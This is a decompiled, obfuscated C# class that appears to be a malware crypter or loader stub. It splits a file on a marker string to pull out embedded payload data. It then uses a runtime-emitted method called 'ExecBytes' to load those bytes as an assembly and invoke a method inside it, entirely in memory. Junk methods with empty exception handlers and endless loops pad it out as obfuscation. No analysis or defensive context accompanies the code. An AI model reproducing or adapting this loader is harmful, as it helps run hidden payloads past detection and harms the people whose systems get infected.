using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using RW;

internal class Class6
{
	internal static object[] object_0 = Strings.Split(File.ReadAllText(Po.licate), "BUYbSvE5lQT", -1, (CompareMethod)0);

	public void method_0()
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			try
			{
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				new decimal(1791350190L);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void method_1()
	{
		new decimal(-1953490510L);
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
		}
	}

	public static object smethod_0(byte[] byte_0, string string_0)
	{
		DynamicMethod dynamicMethod = new DynamicMethod("ExecBytes", typeof(object), new Type[4]
		{
			typeof(byte[]),
			typeof(object[]),
			typeof(string),
			typeof(string)
		}, typeof(object));
		ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
		iLGenerator.Emit(OpCodes.Ldarg_0);
		iLGenerator.EmitCall(OpCodes.Call, typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }), null);
		iLGenerator.Emit(OpCodes.Ldarg_2);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Assembly).GetMethod("GetType", new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldarg_3);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Type).GetMethod("GetMethod", new Type[1] { typeof(string) }), null);
		iLGenerator.Emit(OpCodes.Ldnull);
		iLGenerator.Emit(OpCodes.Ldarg_1);
		iLGenerator.EmitCall(OpCodes.Callvirt, typeof(MethodBase).GetMethod("Invoke", new Type[2]
		{
			typeof(object),
			typeof(object[])
		}), null);
		iLGenerator.Emit(OpCodes.Ret);
		return dynamicMethod.Invoke(null, new object[4]
		{
			byte_0,
			new object[0],
			"A.A",
			string_0
		});
	}

	public void CgdIiAns9()
	{
	}
}
